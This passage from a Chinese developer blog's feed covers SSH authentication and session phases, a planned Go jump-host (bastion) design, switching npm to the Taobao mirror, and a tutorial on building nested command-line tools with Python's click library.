<li>客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。</li>
<li>服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。</li>
<li>客户端从认证方法列表中选取一种认证方法再次进行认证。</li>
<li>该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。</li>
</ol>
<p>用户认证是在加密过会进行的, 所以用于认证的数据是不会暴露的,通常而言SSH提供2认证方式:</p>
<ol>
<li>password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。</li>
<li>publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息<br>SSH2.0还提供了 password-publickey 认证和 any 认证:</li>
<li>password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。</li>
<li>any认证：指定该用户的认证方式可以是 password，也可以是 publickey。</li>
</ol>
<p>一般而言默认使用的any。<br>这张图描述了在加密过程上的认证:<br><img src="http://oiw1gzfww.bkt.clouddn.com/ssh-connection.png" alt=""></p>
<h3 id="会话交互"><a href="#会话交互" class="headerlink" title="会话交互"></a>会话交互</h3><p>会话请求阶段： </p>
<ol>
<li>服务器等待客户端的请求；</li>
<li>认证通过后，客户端向服务器发送会话请求；</li>
<li>服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。</li>
</ol>
<p>交互会话阶段，在这个模式下，数据被双向传送:</p>
<ol>
<li>客户端将要执行的命令加密后传给服务器;</li>
<li>服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端;</li>
<li>客户端将接收到的结果解密后显示到终端上.</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SSH对于大多数人来说应该并不陌生, 无论你是开发还是测试还是运维, 只要你需要登录类Unix服务器都会用到, 他被用来提供链接的安全保障, 比如常见的客户端有命令行工具ssh, 以及周边的商业工具Xshell等。在这篇文章里我们不会教你如何使用xshell, 而是从协议层面全新的认识下ssh。&lt;br&gt;
    
    </summary>
    
      <category term="协议详解" scheme="https://blog.yumaojun.net/categories/%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
    
      <category term="ssh" scheme="https://blog.yumaojun.net/categories/%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/ssh/"/>
    
    
      <category term="ssh-jumphost" scheme="https://blog.yumaojun.net/tags/ssh-jumphost/"/>
    
  </entry>
  
  <entry>
    <title>跳板机系列(一)-架构与简介</title>
    <link href="https://blog.yumaojun.net/2017/02/15/go-ssh/"/>
    <id>https://blog.yumaojun.net/2017/02/15/go-ssh/</id>
    <published>2017-02-15T05:49:19.000Z</published>
    <updated>2017-02-22T15:50:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>一直参与JumpServer的开发, 也一直在想如何设计一个相对完美的跳板机, 跳板机的本质是ssh协议的反向代理(主要还是ssh, 至于rdp还没想过), 虽然也经常使用ssh(做运维的时候还专门就ssh学习过), 但也仅仅是ssh客户端的使用以及服务端的配置, 我觉得一个完美的跳板机应该是从协议层面解决这个问题。因此打算以Golang为开发语言(因为ssh库完善，websocket编写简单),开发一个有基本功能的跳板机。<br><a id="more"></a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>这一系列的博客 包含很多篇, 主要目的是: 在之前的经验上, 把开发过程中涉及到的所有知识和感想记录下来(当然包含源码), 这一系列涉及如下文章, 由浅入深, 循序渐进的介绍开发过程中涉及到的各种知识:</p>
<ul>
<li><a href="/2017/02/15/go-ssh/" title="跳板机系列(一)-架构与简介">跳板机系列(一)-架构与简介</a></li>
<li><a href="/2017/02/16/ssh-protocol/" title="跳板机系列(二)-ssh协议原理简介">跳板机系列(二)-ssh协议原理简介</a></li>
<li><a href="/2017/02/22/ssh-protocol-go/" title="跳板机系列(三)-SSH在Golang中的使用">跳板机系列(三)-SSH在Golang中的使用</a>
</li>
</ul>
<h2 id="简单架构"><a href="#简单架构" class="headerlink" title="简单架构"></a>简单架构</h2><p>之前JumpServer的核心是按照简单的架构来开发的, 一个简单的架构其实已经有很多不错的demo或者产品了, 比如这个项目<a href="http://git.oschina.net/shibingli/webconsole" target="_blank" rel="external">webconsole</a>, 当然他不完整仅仅实现了web，至于命令行并没有实现, 而jumpserver这2个都实现了。<br>为什么称之为简单的架构, 因为他的核心思想就是: 就是模拟一个终端(web端的xterm这个js库就是干这个事儿的, 而命令行同样模拟一个终端就行了, 比如golang的ssh/terminal这个库就可以完成这个事儿),然后通过一个ssh agent访问后面的真实的服务器，起到一个代理转发的作用。<br><img src="http://oiw1gzfww.bkt.clouddn.com/jump-design-simple.png" alt=""></p>
<p>这种模式的缺陷主要体现在命令行终端上面, 因为此时终端后面接的就是ssh客户端, 因此这个终端是一个客户端和跳板机绑定在一起了, 用户只有先登录跳板机才能使用代理服务, 而这显然是不合理的,Jumpserver在此上进行了改进, 通过再添加一个ssh server监听, 实际上就是ssh-in-ssh。</p>
<h2 id="架构改进"><a href="#架构改进" class="headerlink" title="架构改进"></a>架构改进</h2><p>改进过后主要加入一个ssh的代理服务,统一代理层, 抽离客户端。<br><img src="http://oiw1gzfww.bkt.clouddn.com/jump-design-update.png" alt=""></p>
<h2 id="完美架构"><a href="#完美架构" class="headerlink" title="完美架构"></a>完美架构</h2><p>个人架构的能力还是很菜的, 对ssh协议的理解也不深, 当看到teleport这个开源产品的设计时, 完全被惊呆了。 这不就是我想要的架构嘛, 而且细节是做的那么的漂亮。<br><img src="http://gravitational.com/teleport/docs/img/everything.svg" alt=""><br>后期如果有时间的话, 打算写一个关于teleport源码解读的系列, 一点一个剖析这个完美架构的实现。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写这一个系列不容易, 这是一个开篇和规划，希望最后能完美的收尾，有一个不错的demo展示给大家。<br>现在看来teleport已经很完善了, 也符合我心目中的跳板机的样子, 等读完teleport源码过后, 看其是否完善, 扩展是否方便, 因此很有可能是完善teleport,而不是从头开始。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直参与JumpServer的开发, 也一直在想如何设计一个相对完美的跳板机, 跳板机的本质是ssh协议的反向代理(主要还是ssh, 至于rdp还没想过), 虽然也经常使用ssh(做运维的时候还专门就ssh学习过), 但也仅仅是ssh客户端的使用以及服务端的配置, 我觉得一个完美的跳板机应该是从协议层面解决这个问题。因此打算以Golang为开发语言(因为ssh库完善，websocket编写简单),开发一个有基本功能的跳板机。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="ssh-jumphost" scheme="https://blog.yumaojun.net/tags/ssh-jumphost/"/>
    
  </entry>
  
  <entry>
    <title>nodejs源加速</title>
    <link href="https://blog.yumaojun.net/2017/02/14/nodejs-accelerate/"/>
    <id>https://blog.yumaojun.net/2017/02/14/nodejs-accelerate/</id>
    <published>2017-02-14T04:50:33.000Z</published>
    <updated>2017-02-14T05:18:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前介绍过使用vscode搭建nodejs开发环境, 环境是搭建好了, 使用时有一个硬伤, 就是nodejs官方的源下载奇慢, 而一般js的项目依赖又多, 所以经常的结果就是: 慢得你啥都装不上(time out)。怎么解决喃？ 当然是换国内的源。<br><a id="more"></a><br>我仅使用过淘宝的加速源，效果不错，一直用着，下面做简单的介绍。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>淘宝NPM镜像官方是这样描述的: <strong>这是一个完整 npmjs.org 镜像，你可以用此代替官方版本(只读)，同步频率目前为 10分钟 一次以保证尽量与官方服务同步。</strong><br>关于更多的信息请查看:<a href="https://npm.taobao.org/" target="_blank" rel="external">淘宝NPM源官网</a></p>
<h2 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h2><p>从registry.npm.taobao.org安装所有模块. 当安装的时候发现安装的模块还没有同步过来, 淘宝NPM会自动在后台进行同步, 并且会让你从官方 NPM registry.npmjs.org 进行安装. 下次你再安装这个模块的时候, 就会直接从 淘宝 NPM 安装了.</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>临时使用的话, 可以通过registry参数来指定淘宝源地址，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm --registry=https://registry.npm.taobao.org xterm</div></pre></td></tr></table></figure></p>
<p>当然也可以添加命令别名,这样就不用每次都添加–registry了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">alias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \</div><div class="line">--cache=$HOME/.npm/.cache/cnpm \</div><div class="line">--disturl=https://npm.taobao.org/dist \</div><div class="line">--userconfig=$HOME/.cnpmrc&quot;</div><div class="line"></div><div class="line"># Or alias it in .bashrc or .zshrc</div><div class="line">$ echo &apos;\n#alias for cnpm\nalias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \</div><div class="line">  --cache=$HOME/.npm/.cache/cnpm \</div><div class="line">  --disturl=https://npm.taobao.org/dist \</div><div class="line">  --userconfig=$HOME/.cnpmrc&quot;&apos; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc</div></pre></td></tr></table></figure></p>
<p>其实淘宝的源很稳定，同步频率也快，因此一般直接替换系统的npm也可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前介绍过使用vscode搭建nodejs开发环境, 环境是搭建好了, 使用时有一个硬伤, 就是nodejs官方的源下载奇慢, 而一般js的项目依赖又多, 所以经常的结果就是: 慢得你啥都装不上(time out)。怎么解决喃？ 当然是换国内的源。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="JavaScript" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/JavaScript/"/>
    
    
      <category term="源加速" scheme="https://blog.yumaojun.net/tags/%E6%BA%90%E5%8A%A0%E9%80%9F/"/>
    
  </entry>
  
  <entry>
    <title>Python命令行开发神器-click</title>
    <link href="https://blog.yumaojun.net/2017/02/08/python-click/"/>
    <id>https://blog.yumaojun.net/2017/02/08/python-click/</id>
    <published>2017-02-08T05:29:35.000Z</published>
    <updated>2017-02-09T06:03:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前写过一篇博客介绍过如何写漂亮的命令行工具, 不过使用的是golang的cobra库, 整体而言效果和使用体验还是非常不错的, 不过今天看博客时发现了一个更不错的库，而且是Python的: Click,所以用起来应该更得心应手。 之前在开发openstack客户端时, 模仿openstack sdk写过CLI, 他也是对argparse库上做的封装, 但是使用起来也比较复杂, 简单看了下click的文档, 体验还是非常不错的。<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>先说下click的出生, 因为他出生名门: Pocoo, Pocoo是一个团队，Pocoo出品必是精品,比如 Flask, Werkzeug, Jinja 2 , Pygments, Sphinx。冲着pocoo的品牌, 都应该多看一眼click。<br>click是一个用于快速构建命令行的python的第三方模块, 功能强大, 使用简单。我们都知道Python内置的Argparse模块，以前也经常用到, 当时觉得Argparse很不错, 因为没有对比(没有对比就没伤害), 看了下Click马上就觉得Argparse太繁琐了，Click相较于Argparse就好比requests对比urllib。<br>我们看看click官方文档上是怎么说明click的：</p>
<blockquote>
<p>Click是一个使用最少代码构建漂亮CLI的命令行界面创建工具包, 高度可配置,但是却开箱即用<br>他有3个特点：</p>
<ul>
<li>支持命令的任意嵌套</li>
<li>支持命令行帮助页面的自动生成</li>
<li>支持子命令运行时惰性加载</li>
</ul>
</blockquote>
<h2 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h2><p>构建CLI有2个要点: 命令和参数, 使用click时，@click.command()用户装饰命令, @click.option()和@click.argument()用于装饰参数, 比如下面就是一个经典的使用形式:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> click</div><div class="line"></div><div class="line"><span class="meta">@click.command()</span></div><div class="line"><span class="meta">@click.option('--count', default=1, help='Number of greetings.')</span></div><div class="line"><span class="meta">@click.option('--name', prompt='Your name',</span></div><div class="line">              help=<span class="string">'The person to greet.'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(count, name)</span>:</span></div><div class="line">    <span class="string">"""Simple program that greets NAME for a total of COUNT times."""</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(count):</div><div class="line">        click.echo(<span class="string">'Hello %s!'</span> % name)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    hello()</div></pre></td></tr></table></figure></p>
<p>为了演示他更强大的功能, 我们可以模拟一个docker的命令行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> click</div><div class="line"></div><div class="line"><span class="meta">@click.group()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">docker</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@docker.group()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">volume</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Manage volumes"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@volume.command()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Create a volume"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@volume.command()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">inspect</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""isplay detailed information on one or more volumes"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@volume.command()</span></div><div class="line"><span class="meta">@click.option('-f', '--filter', type=str, help="Provide filter values (e.g. 'dangling=true')")</span></div><div class="line"><span class="meta">@click.option('-q', '--quiet', is_flag=True, help='Only display volume names')</span></div><div class="line"><span class="meta">@click.option('--format', type=str, help='Pretty-print volumes using a Go template')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ls</span><span class="params">(filter, quiet, format)</span>:</span></div><div class="line">    <span class="string">"""List volumes"""</span></div><div class="line">    print(<span class="string">"%s, %s, %s"</span> % (filter, quiet, format))</div><div class="line"></div><div class="line"><span class="meta">@volume.command()</span></div><div class="line"><span class="meta">@click.option('-f', '--force', type=str, help='Force the removal of a running container (uses SIGKILL)')</span></div><div class="line"><span class="meta">@click.option('-l', '--link', type=str, help='Remove the specified link')</span></div><div class="line"><span class="meta">@click.option('-v', '--volume', type=str, help='Remove the volumes associated with the container')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">(force, link, volume)</span>:</span></div><div class="line">    <span class="string">"""Remove one or more volumes"""</span></div><div class="line">    print(<span class="string">"%s, %s, %s"</span> % (force, link, volume))</div><div class="line"></div><div class="line"><span class="meta">@docker.group()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">network</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Manage networks"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@network.command()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Create a network"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@network.command()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Connect a container to a network"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@network.command()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ls</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""List networks"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@network.command()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Remove one or more networks"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    docker()</div></pre></td></tr></table></figure></p>
<p>最终效果如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">➜  test python3 test.py</div><div class="line">Usage: test.py [OPTIONS] COMMAND [ARGS]...</div><div class="line"></div><div class="line">Options:</div><div class="line">  --help  Show this message and exit.</div><div class="line"></div><div class="line">Commands:</div><div class="line">  network  Manage networks</div><div class="line">  volume   Manage volumes</div><div class="line"></div><div class="line">➜  test python3 test.py network</div><div class="line">Usage: test.py network [OPTIONS] COMMAND [ARGS]...</div><div class="line"></div><div class="line">  Manage networks</div><div class="line"></div><div class="line">Options:</div><div class="line">  --help  Show this message and exit.</div><div class="line"></div><div class="line">Commands:</div><div class="line">  connect  Connect a container to a network</div><div class="line">  create   Create a network</div><div class="line">  ls       List networks</div><div class="line">  rm       Remove one or more networks</div><div class="line"></div><div class="line">➜  test python3 test.py volume</div><div class="line">Usage: test.py volume [OPTIONS] COMMAND [ARGS]...</div><div class="line"></div><div class="line">  Manage volumes</div><div class="line"></div><div class="line">Options:</div><div class="line">  --help  Show this message and exit.</div><div class="line"></div><div class="line">Commands:</div><div class="line">  create   Create a volume</div><div class="line">  inspect  isplay detailed information on one or more...</div><div class="line">  ls       List volumes</div><div class="line">  rm       Remove one or more volumes</div><div class="line"></div><div class="line">➜  test python3 test.py volume ls --help</div><div class="line">Usage: test.py volume ls [OPTIONS]</div><div class="line"></div><div class="line">  List volumes</div><div class="line"></div><div class="line">Options:</div><div class="line">  -f, --filter TEXT  Provide filter values (e.g. &apos;dangling=true&apos;)</div><div class="line">  -q, --quiet        Only display volume names</div><div class="line">  --format TEXT      Pretty-print volumes using a Go template</div><div class="line">  --help             Show this message and exit.</div><div class="line"></div><div class="line">➜  test python3 test.py volume rm --help</div><div class="line">Usage: test.py volume rm [OPTIONS]</div><div class="line"></div><div class="line">  Remove one or more volumes</div><div class="line"></div><div class="line">Options:</div><div class="line">  -f, --force TEXT   Force the removal of a running container (uses SIGKILL)</div><div class="line">  -l, --link TEXT    Remove the specified link</div><div class="line">  -v, --volume TEXT  Remove the volumes associated with the container</div><div class="line">  --help             Show this message and exit.</div></pre></td></tr></table></figure></p>
<h2 id="命令与组"><a href="#命令与组" class="headerlink" title="命令与组"></a>命令与组</h2><p>这是click中最重要的概念, 我们可以通过command和group装饰器实现一个无限嵌套的命令行工具, 其中command用户装饰命令, group用于将命令分组(类)<br>上面那个模块docker命令行就是分组的使用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> click</div><div class="line"></div><div class="line"><span class="meta">@click.group()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">docker</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@docker.group()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">volume</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Manage volumes"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@docker.group()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">network</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Manage networks"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@network.command()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Create a network"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    docker()</div></pre></td></tr></table></figure></p>
<h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>从命令行读取参数值，再将其传递给函数,读取的参数分为两类: 可选参数和必须参数，下面分别做介绍</p>
<h3 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h3><p>使用@click.option装饰器完成可选参数的录入, 通过上面的栗子我们可以发现该装饰器有很多参数前面2个位置参数比如’-f’, ‘–force’用于描述参数名称, type指明参数等，option常用的设置参数如下：</p>
<ul>
<li>default: 设置命令行参数的默认值</li>
<li>help: 参数说明</li>
<li>type: 参数类型，可以是 string, int, float 等</li>
<li>prompt: 当在命令行中没有输入相应的参数时，会根据 prompt 提示用户输入</li>
<li>nargs: 指定命令行参数接收的值的个数<br>我们可以依然这些选项来完成我们很长常用的功能</li>
</ul>
<h4 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h4><p>经常我们需要为参数设置一些默认值, 使用default指定参数的默认值就能办到, 就这么简单<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> click</div><div class="line"></div><div class="line"><span class="meta">@click.group()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">docker</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@docker.group()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">volume</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Manage volumes"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@docker.group()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">network</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">"""Manage networks"""</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@network.command()</span></div><div class="line"><span class="meta">@click.option('-n', '--name', type=str, default='flat', help='The network name')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(name)</span>:</span></div><div class="line">    <span class="string">"""Create a network"""</span></div><div class="line">    click.echo(<span class="string">'create network %s success'</span> % name)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    docker()</div></pre></td></tr></table></figure></p>
<p>运行结果:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">➜  test python3 test.py network --help</div><div class="line">Usage: test.py network [OPTIONS] COMMAND [ARGS]...</div><div class="line"></div><div class="line">  Manage networks</div><div class="line"></div><div class="line">Options:</div><div class="line">  --help  Show this message <span class="keyword">and</span> exit.</div><div class="line"></div><div class="line">Commands:</div><div class="line">  create  Create a network</div><div class="line">➜  test python3 test.py network create</div><div class="line">create network flat success</div></pre></td></tr></table></figure></p>
<h4 id="选择参数"><a href="#选择参数" class="headerlink" title="选择参数"></a>选择参数</h4><p>很多情况下, 我们也会给用户一些选择参数, 比如性别就只能选择(M/F), 因此我们应该提示用户输入正确的值,在这种情况下，我们可以通过 click.Choice() 来限定<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@user.command()</span></div><div class="line"><span class="meta">@click.option('-g', '--gender', type=click.Choice(['male', 'female']), help="The user's gender")</span></div><div class="line"><span class="meta">@click.help_option('-h', '--help')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(gender)</span>:</span></div><div class="line">    <span class="string">"""Create a user"""</span></div><div class="line">    <span class="keyword">if</span> gender <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">raise</span> click.BadOptionUsage(<span class="string">"miss gender choice!"</span>)</div><div class="line">    click.echo(<span class="string">"user's gender is %s"</span> % gender)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    docker()</div></pre></td></tr></table></figure></p>
